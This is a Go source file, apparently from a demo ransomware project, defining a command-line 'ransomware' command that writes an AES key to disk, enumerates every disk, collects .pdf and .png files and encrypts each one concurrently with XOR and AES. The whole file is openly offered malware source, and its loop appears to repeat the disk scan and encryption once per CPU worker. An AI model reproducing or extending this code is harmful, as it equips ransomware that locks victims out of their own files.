package cmd

import (
	"davidlares/ransomware/aes"
	"davidlares/ransomware/encrypt"
	"davidlares/ransomware/mapper"
	"fmt"
	"runtime"

	"github.com/spf13/cobra"
)

var encryptCmd = &cobra.Command{
	Use:   "ransomware",
	Short: "GoLang Ransomware Encrypt function",
	Long:  `A simple Ransomware Encrypt functionality built with GoLang.`,
	Run: func(cmd *cobra.Command, args []string) {
		// saving the AES key for later encryption
		aes.SaveKeyFile("aes_key.txt")
		// encrypt control
		encryptControl := make(chan struct{}, 10)
		// disk
		disk := mapper.ListingDisks()
		// getting workers
		numWorker := runtime.NumCPU()
		// looping workers
		for x := 0; x < numWorker; x++ {
			// looping disks
			for _, disk := range disk {
				files := mapper.MapFiles(disk, []string{".pdf", ".png"})
				for _, file := range files {
					fmt.Println("Files found")
					encryptControl <- struct{}{}
					go encrypt.EncryptWithXorAndAES(x, file, "aes_key.txt", encryptControl)
				}
			}
		}
		// then
		mapper.Wg.Wait()
	},
}

// adding child commands to the encrypt command (= flags)
func init() {
	rootCmd.AddCommand(encryptCmd)
}
